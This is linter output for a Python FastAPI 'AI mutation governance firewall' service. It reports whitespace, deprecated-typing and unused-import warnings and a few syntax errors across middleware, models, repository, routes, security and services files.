95 | DARPA, defense, sovereign AI labs would care.",
   |                                              ^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> governance\ai-mutation-governance-firewall\main.py:96:5
   |
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
96 |     version="1.0.0",
   |     ^^^^^^^
97 |     lifespan=lifespan,
98 | docs_url="/api/v1/docs",
   |

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:18:1
   |
16 | class RequestIDMiddleware(BaseHTTPMiddleware):
17 |     """Add unique request ID to each request"""
18 |     
   | ^^^^
19 |     async def dispatch(self, request: Request, call_next: Callable):
20 |         # Generate or extract request ID
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:22:1
   |
20 |         # Generate or extract request ID
21 |         request_id = request.headers.get("X-Request-ID", str(uuid.uuid4()))
22 |         
   | ^^^^^^^^
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:25:1
   |
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
25 |         
   | ^^^^^^^^
26 |         # Add to request state
27 |         request.state.request_id = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:28:1
   |
26 |         # Add to request state
27 |         request.state.request_id = request_id
28 |         
   | ^^^^^^^^
29 |         # Call next middleware
30 |         response = await call_next(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:31:1
   |
29 |         # Call next middleware
30 |         response = await call_next(request)
31 |         
   | ^^^^^^^^
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:34:1
   |
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
34 |         
   | ^^^^^^^^
35 |         return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:40:1
   |
38 | class MetricsMiddleware(BaseHTTPMiddleware):
39 |     """Collect Prometheus metrics for requests"""
40 |     
   | ^^^^
41 |     async def dispatch(self, request: Request, call_next: Callable):
42 |         # Skip metrics endpoint itself
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:45:1
   |
43 |         if request.url.path == "/metrics":
44 |             return await call_next(request)
45 |         
   | ^^^^^^^^
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:48:1
   |
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
48 |         
   | ^^^^^^^^
49 |         # Record start time
50 |         start_time = time.time()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:51:1
   |
49 |         # Record start time
50 |         start_time = time.time()
51 |         
   | ^^^^^^^^
52 |         try:
53 |             # Process request
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:55:1
   |
53 |             # Process request
54 |             response = await call_next(request)
55 |             
   | ^^^^^^^^^^^^
56 |             # Record metrics
57 |             duration = time.time() - start_time
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:59:1
   |
57 |             duration = time.time() - start_time
58 |             status_class = f"{response.status_code // 100}xx"
59 |             
   | ^^^^^^^^^^^^
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:62:1
   |
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
62 |             
   | ^^^^^^^^^^^^
63 |             REQUEST_COUNT.labels(
64 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:68:1
   |
66 |                 status_class=status_class,
67 |             ).inc()
68 |             
   | ^^^^^^^^^^^^
69 |             REQUEST_DURATION.labels(
70 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:73:1
   |
71 |                 route_template=route_template,
72 |             ).observe(duration)
73 |             
   | ^^^^^^^^^^^^
74 |             return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:75:1
   |
74 |             return response
75 |         
   | ^^^^^^^^
76 |         finally:
77 |             # Decrement inflight requests
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:79:1
   |
77 |             # Decrement inflight requests
78 |             INFLIGHT_REQUESTS.dec()
79 |     
   | ^^^^
80 |     @staticmethod
81 |     def _get_route_template(request: Request) -> str:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:90:1
   |
88 | class RateLimitMiddleware(BaseHTTPMiddleware):
89 |     """Token bucket rate limiter"""
90 |     
   | ^^^^
91 |     def __init__(self, app, requests_per_minute: int = 100, burst: int = 200):
92 |         super().__init__(app)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> governance\ai-mutation-governance-firewall\middleware.py:97:1
   |
95 |         self.tokens = {}  # client_id -> (tokens, last_update)
96 |         self.rate = requests_per_minute / 60.0  # tokens per second
97 |     
   | ^^^^
98 |     async def dispatch(self, request: Request, call_next: Callable):
99 |         # Skip health checks and metrics
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:102:1
    |
100 |         if request.url.path in ["/health", "/health/ready", "/health/live", "/metrics"]:
101 |             return await call_next(request)
102 |         
    | ^^^^^^^^
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:105:1
    |
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
105 |         
    | ^^^^^^^^
106 |         # Check rate limit
107 |         if not self._allow_request(client_id):
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:120:1
    |
118 |                 headers={"Retry-After": "60"},
119 |             )
120 |         
    | ^^^^^^^^
121 |         return await call_next(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:122:1
    |
121 |         return await call_next(request)
122 |     
    | ^^^^
123 |     def _get_client_id(self, request: Request) -> str:
124 |         """Get client identifier for rate limiting"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:128:1
    |
126 |         if hasattr(request.state, "user"):
127 |             return f"user:{request.state.user}"
128 |         
    | ^^^^^^^^
129 |         # Fall back to IP address
130 |         forwarded_for = request.headers.get("X-Forwarded-For")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:133:1
    |
131 |         if forwarded_for:
132 |             return f"ip:{forwarded_for.split(',')[0].strip()}"
133 |         
    | ^^^^^^^^
134 |         return f"ip:{request.client.host}"
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:135:1
    |
134 |         return f"ip:{request.client.host}"
135 |     
    | ^^^^
136 |     def _allow_request(self, client_id: str) -> bool:
137 |         """Check if request is allowed (token bucket algorithm)"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:139:1
    |
137 |         """Check if request is allowed (token bucket algorithm)"""
138 |         now = time.time()
139 |         
    | ^^^^^^^^
140 |         if client_id not in self.tokens:
141 |             self.tokens[client_id] = (self.burst - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:143:1
    |
141 |             self.tokens[client_id] = (self.burst - 1, now)
142 |             return True
143 |         
    | ^^^^^^^^
144 |         tokens, last_update = self.tokens[client_id]
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:145:1
    |
144 |         tokens, last_update = self.tokens[client_id]
145 |         
    | ^^^^^^^^
146 |         # Add tokens based on time elapsed
147 |         elapsed = now - last_update
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:149:1
    |
147 |         elapsed = now - last_update
148 |         tokens = min(self.burst, tokens + elapsed * self.rate)
149 |         
    | ^^^^^^^^
150 |         if tokens >= 1:
151 |             self.tokens[client_id] = (tokens - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:160:1
    |
158 | class AuthenticationMiddleware(BaseHTTPMiddleware):
159 |     """Authentication middleware"""
160 |     
    | ^^^^
161 |     # Public endpoints that don't require authentication
162 |     PUBLIC_PATHS = [
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:173:1
    |
171 |         "/api/v1/openapi.json",
172 |     ]
173 |     
    | ^^^^
174 |     async def dispatch(self, request: Request, call_next: Callable):
175 |         # Skip public endpoints
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:178:1
    |
176 |         if request.url.path in self.PUBLIC_PATHS:
177 |             return await call_next(request)
178 |         
    | ^^^^^^^^
179 |         # Try authentication
180 |         authenticated = False
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:182:1
    |
180 |         authenticated = False
181 |         user = None
182 |         
    | ^^^^^^^^
183 | # Try API key authentication
184 |         api_key = request.headers.get("X-API-Key")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:210:1
    |
208 |                 headers={"WWW-Authenticate": "Bearer"},
209 |             )
210 |         
    | ^^^^^^^^
211 |         # Add user to request state
212 |         request.state.user = user
    |
help: Remove whitespace from blank line

invalid-syntax: unindent does not match any outer indentation level
   --> governance\ai-mutation-governance-firewall\middleware.py:212:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
    | ^^^^^^^^
213 |         
214 |         return await call_next(request)
    |

W293 Blank line contains whitespace
   --> governance\ai-mutation-governance-firewall\middleware.py:213:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
213 |         
    | ^^^^^^^^
214 |         return await call_next(request)
    |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> governance\ai-mutation-governance-firewall\middleware.py:214:1
    |
212 |         request.state.user = user
213 |         
214 |         return await call_next(request)
    | ^^^^^^^^
    |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> governance\ai-mutation-governance-firewall\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> governance\ai-mutation-governance-firewall\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> governance\ai-mutation-governance-firewall\models.py:16:23
   |
14 |     proposer_id: str
15 |     target_component: str
16 |     proposed_changes: Dict[str, Any]
   |                       ^^^^
17 |     rationale: str
18 |     risk_assessment: str
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> governance\ai-mutation-governance-firewall\models.py:20:25
   |
18 |     risk_assessment: str
19 |     status: str = "pending"  # pending, simulating, validated, rejected, applied
20 |     simulation_results: Optional[Dict[str, Any]] = None
   |                         ^^^^^^^^^^^^^^^^^^^^^^^^
21 |     quorum_signatures: List[str] = []
22 |     created_at: datetime = Field(default_factory=datetime.now)
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> governance\ai-mutation-governance-firewall\models.py:20:34
   |
18 |     risk_assessment: str
19 |     status: str = "pending"  # pending, simulating, validated, rejected, applied
20 |     simulation_results: Optional[Dict[str, Any]] = None
   |                                  ^^^^
21 |     quorum_signatures: List[str] = []
22 |     created_at: datetime = Field(default_factory=datetime.now)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> governance\ai-mutation-governance-firewall\models.py:21:24
   |
19 |     status: str = "pending"  # pending, simulating, validated, rejected, applied
20 |     simulation_results: Optional[Dict[str, Any]] = None
21 |     quorum_signatures: List[str] = []
   |                        ^^^^
22 |     created_at: datetime = Field(default_factory=datetime.now)
23 |     updated_at: datetime = Field(default_factory=datetime.now)
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> governance\ai-mutation-governance-firewall\models.py:29:23
   |
27 |     proposer_id: str
28 |     target_component: str
29 |     proposed_changes: Dict[str, Any]
   |                       ^^^^
30 |     rationale: str
31 |     risk_assessment: str
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> governance\ai-mutation-governance-firewall\models.py:35:13
   |
34 | class ProposalUpdate(BaseModel):
35 |     status: Optional[str] = None
   |             ^^^^^^^^^^^^^
36 |     simulation_results: Optional[Dict[str, Any]] = None
37 |     quorum_signatures: Optional[List[str]] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> governance\ai-mutation-governance-firewall\models.py:36:25
   |
34 | class ProposalUpdate(BaseModel):
35 |     status: Optional[str] = None
36 |     simulation_results: Optional[Dict[str, Any]] = None
   |                         ^^^^^^^^^^^^^^^^^^^^^^^^
37 |     quorum_signatures: Optional[List[str]] = None
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> governance\ai-mutation-governance-firewall\models.py:36:34
   |
34 | class ProposalUpdate(BaseModel):
35 |     status: Optional[str] = None
36 |     simulation_results: Optional[Dict[str, Any]] = None
   |                                  ^^^^
37 |     quorum_signatures: Optional[List[str]] = None
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> governance\ai-mutation-governance-firewall\models.py:37:24
   |
35 |     status: Optional[str] = None
36 |     simulation_results: Optional[Dict[str, Any]] = None
37 |     quorum_signatures: Optional[List[str]] = None
   |                        ^^^^^^^^^^^^^^^^^^^
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> governance\ai-mutation-governance-firewall\models.py:37:33
   |
35 |     status: Optional[str] = None
36 |     simulation_results: Optional[Dict[str, Any]] = None
37 |     quorum_signatures: Optional[List[str]] = None
   |                                 ^^^^
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> governance\ai-mutation-governance-firewall\models.py:41:12
   |
40 | class PaginatedProposals(BaseModel):
41 |     items: List[MutationProposal]
   |            ^^^^
42 |     total: int
43 |     page: int
   |
help: Replace with `list`

F401 [*] `asyncio` imported but unused
 --> governance\ai-mutation-governance-firewall\repository.py:5:8
  |
3 | """
4 |
5 | import asyncio
  |        ^^^^^^^
6 | import time
7 | from datetime import datetime
  |
help: Remove unused import: `asyncio`

F401 [*] `time` imported but unused
 --> governance\ai-mutation-governance-firewall\repository.py:6:8
  |
5 | import asyncio
6 | import time
  |        ^^^^
7 | from datetime import datetime
8 | from typing import Any, Dict, List, Optional, Tuple
  |
help: Remove unused import: `time`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> governance\ai-mutation-governance-firewall\repository.py:8:1
  |
6 | import time
7 | from datetime import datetime
8 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
9 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> governance\ai-mutation-governance-firewall\repository.py:8:1
  |
6 | import time
7 | from datetime import datetime
8 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
9 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> governance\ai-mutation-governance-firewall\repository.py:8:1
  |
6 | import time
7 | from datetime import datetime
8 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
9 | from uuid import UUID
  |

F401 [*] `.config.settings` imported but unused
  --> governance\ai-mutation-governance-firewall\repository.py:11:21
   |
 9 | from uuid import UUID
10 |
11 | from .config import settings
   |                     ^^^^^^^^
12 | from .errors import DatabaseError
13 | from .logging_config import logger
   |
help: Remove unused import: `.config.settings`

F401 [*] `.errors.DatabaseError` imported but unused
  --> governance\ai-mutation-governance-firewall\repository.py:12:21
   |
11 | from .config import settings
12 | from .errors import DatabaseError
   |                     ^^^^^^^^^^^^^
13 | from .logging_config import logger
14 | from .metrics import DB_CONNECTIONS_ACTIVE, DB_ERRORS, DB_QUERY_DURATION
   |
help: Remove unused import: `.errors.DatabaseError`

F401 [*] `.metrics.DB_ERRORS` imported but unused
  --> governance\ai-mutation-governance-firewall\repository.py:14:45
   |
12 | from .errors import DatabaseError
13 | from .logging_config import logger
14 | from .metrics import DB_CONNECTIONS_ACTIVE, DB_ERRORS, DB_QUERY_DURATION
   |                                             ^^^^^^^^^
15 | from .models import MutationProposal
   |
help: Remove unused import

F401 [*] `.metrics.DB_QUERY_DURATION` imported but unused
  --> governance\ai-mutation-governance-firewall\repository.py:14:56
   |
12 | from .errors import DatabaseError
13 | from .logging_config import logger
14 | from .metrics import DB_CONNECTIONS_ACTIVE, DB_ERRORS, DB_QUERY_DURATION
   |                                                        ^^^^^^^^^^^^^^^^^
15 | from .models import MutationProposal
   |
help: Remove unused import

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> governance\ai-mutation-governance-firewall\repository.py:22:20
   |
21 |     def __init__(self):
22 |         self.data: Dict[str, Any] = {"proposals": {}}
   |                    ^^^^
23 |         self.connected = False
   |
help: Replace with `dict`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
  --> governance\ai-mutation-governance-firewall\repository.py:48:10
   |
46 |     async def list(
47 |         self, offset: int = 0, limit: int = 20
48 |     ) -> Tuple[List[MutationProposal], int]:
   |          ^^^^^
49 |         proposals_list = list(self.db.data["proposals"].values())
50 |         proposals_list.sort(key=lambda x: x.created_at, reverse=True)
   |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
  --> governance\ai-mutation-governance-firewall\repository.py:48:16
   |
46 |     async def list(
47 |         self, offset: int = 0, limit: int = 20
48 |     ) -> Tuple[List[MutationProposal], int]:
   |                ^^^^
49 |         proposals_list = list(self.db.data["proposals"].values())
50 |         proposals_list.sort(key=lambda x: x.created_at, reverse=True)
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> governance\ai-mutation-governance-firewall\repository.py:54:47
   |
52 |         return proposals_list[offset : offset + limit], total
53 |
54 |     async def get(self, proposal_id: UUID) -> Optional[MutationProposal]:
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^^^
55 |         return self.db.data["proposals"].get(str(proposal_id))
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> governance\ai-mutation-governance-firewall\repository.py:62:43
   |
61 |     async def update(
62 |         self, proposal_id: UUID, updates: Dict[str, Any]
   |                                           ^^^^
63 |     ) -> MutationProposal:
64 |         proposal = await self.get(proposal_id)
   |
help: Replace with `dict`

UP035 `typing.List` is deprecated, use `list` instead
 --> governance\ai-mutation-governance-firewall\routes.py:5:1
  |
3 | """
4 |
5 | from typing import List
  | ^^^^^^^^^^^^^^^^^^^^^^^
6 | from uuid import UUID
  |

F401 [*] `typing.List` imported but unused
 --> governance\ai-mutation-governance-firewall\routes.py:5:20
  |
3 | """
4 |
5 | from typing import List
  |                    ^^^^
6 | from uuid import UUID
  |
help: Remove unused import: `typing.List`

F401 [*] `.models.ProposalUpdate` imported but unused
  --> governance\ai-mutation-governance-firewall\routes.py:15:5
   |
13 |     PaginatedProposals,
14 |     ProposalCreate,
15 |     ProposalUpdate,
   |     ^^^^^^^^^^^^^^
16 | )
17 | from .services import MutationGovernanceService
   |
help: Remove unused import: `.models.ProposalUpdate`

B008 Do not perform function call `Depends` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> governance\ai-mutation-governance-firewall\routes.py:34:42
   |
32 |     page: int = Query(1, ge=1),
33 |     page_size: int = Query(20, ge=1, le=100),
34 |     service: MutationGovernanceService = Depends(get_governance_service),
   |                                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
35 | ):
36 |     """List all mutation proposals with pagination"""
   |

B008 Do not perform function call `Body` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> governance\ai-mutation-governance-firewall\routes.py:57:37
   |
55 | )
56 | async def intake_proposal(
57 |     proposal_data: ProposalCreate = Body(...),
   |                                     ^^^^^^^^^
58 |     service: MutationGovernanceService = Depends(get_governance_service),
59 | ):
   |

B008 Do not perform function call `Depends` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> governance\ai-mutation-governance-firewall\routes.py:58:42
   |
56 | async def intake_proposal(
57 |     proposal_data: ProposalCreate = Body(...),
58 |     service: MutationGovernanceService = Depends(get_governance_service),
   |                                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
59 | ):
60 |     """Submits a new AI mutation proposal for gating and simulation"""
   |

B008 Do not perform function call `Path` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> governance\ai-mutation-governance-firewall\routes.py:71:25
   |
69 | )
70 | async def get_proposal(
71 |     proposal_id: UUID = Path(..., description="Proposal UUID"),
   |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
72 |     service: MutationGovernanceService = Depends(get_governance_service),
73 | ):
   |

B008 Do not perform function call `Depends` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> governance\ai-mutation-governance-firewall\routes.py:72:42
   |
70 | async def get_proposal(
71 |     proposal_id: UUID = Path(..., description="Proposal UUID"),
72 |     service: MutationGovernanceService = Depends(get_governance_service),
   |                                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
73 | ):
74 |     """Fetch status and simulation results of a specific proposal"""
   |

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> governance\ai-mutation-governance-firewall\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> governance\ai-mutation-governance-firewall\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP045 [*] Use `X | None` for type annotations
  --> governance\ai-mutation-governance-firewall\security.py:32:44
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                            ^^^^^^^^^^^^^^^^^^^^^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> governance\ai-mutation-governance-firewall\security.py:32:53
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                                     ^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> governance\ai-mutation-governance-firewall\security.py:49:37
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                     ^^^^^^^^^^^^^^^^^^^^^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> governance\ai-mutation-governance-firewall\security.py:49:46
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                              ^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> governance\ai-mutation-governance-firewall\security.py:103:19
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                   ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> governance\ai-mutation-governance-firewall\security.py:103:29
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                             ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `list`

F401 [*] `datetime.datetime` imported but unused
 --> governance\ai-mutation-governance-firewall\services.py:5:22
  |
3 | """
4 |
5 | from datetime import datetime, timezone
  |                      ^^^^^^^^
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `datetime.timezone` imported but unused
 --> governance\ai-mutation-governance-firewall\services.py:5:32
  |
3 | """
4 |
5 | from datetime import datetime, timezone
  |                                ^^^^^^^^
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |
help: Remove unused import

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> governance\ai-mutation-governance-firewall\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> governance\ai-mutation-governance-firewall\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> governance\ai-mutation-governance-firewall\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

F401 [*] `typing.Any` imported but unused
 --> governance\ai-mutation-governance-firewall\services.py:6:20
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                    ^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Dict` imported but unused
 --> governance\ai-mutation-governance-firewall\services.py:6:25
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                         ^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Optional` imported but unused
 --> governance\ai-mutation-governance-firewall\services.py:6:37
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                                     ^^^^^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `.errors.ValidationError` imported but unused
  --> governance\ai-mutation-governance-firewall\services.py:9:36
   |
 7 | from uuid import UUID
 8 |
 9 | from .errors import NotFoundError, ValidationError
   |                                    ^^^^^^^^^^^^^^^
10 | from .logging_config import logger
11 | from .metrics import DOMAIN_EVENTS, DOMAIN_FAILURES
   |
help: Remove unused import: `.errors.ValidationError`

F401 [*] `.metrics.DOMAIN_FAILURES` imported but unused
  --> governance\ai-mutation-governance-firewall\services.py:11:37
   |
 9 | from .errors import NotFoundError, ValidationError
10 | from .logging_config import logger
11 | from .metrics import DOMAIN_EVENTS, DOMAIN_FAILURES
   |                                     ^^^^^^^^^^^^^^^
12 | from .models import MutationProposal, ProposalCreate, ProposalUpdate
13 | from .repository import ProposalRepository
   |
help: Remove unused import: `.metrics.DOMAIN_FAILURES`

F401 [*] `.models.ProposalUpdate` imported but unused
  --> governance\ai-mutation-governance-firewall\services.py:12:55
   |
10 | from .logging_config import logger
11 | from .metrics import DOMAIN_EVENTS, DOMAIN_FAILURES
12 | from .models import MutationProposal, ProposalCreate, ProposalUpdate
   |                                                       ^^^^^^^^^^^^^^
13 | from .repository import ProposalRepository
   |
help: Remove unused import: `.models.ProposalUpdate`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
  --> governance\ai-mutation-governance-firewall\services.py:61:10
   |
59 |     async def list_proposals(
60 |         self, offset: int = 0, limit: int = 20
61 |     ) -> Tuple[List[MutationProposal], int]:
   |          ^^^^^
62 |         return await self.repository.list(offset, limit)
   |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
  --> governance\ai-mutation-governance-firewall\services.py:61:16
   |
59 |     async def list_proposals(
60 |         self, offset: int = 0, limit: int = 20
61 |     ) -> Tuple[List[MutationProposal], int]:
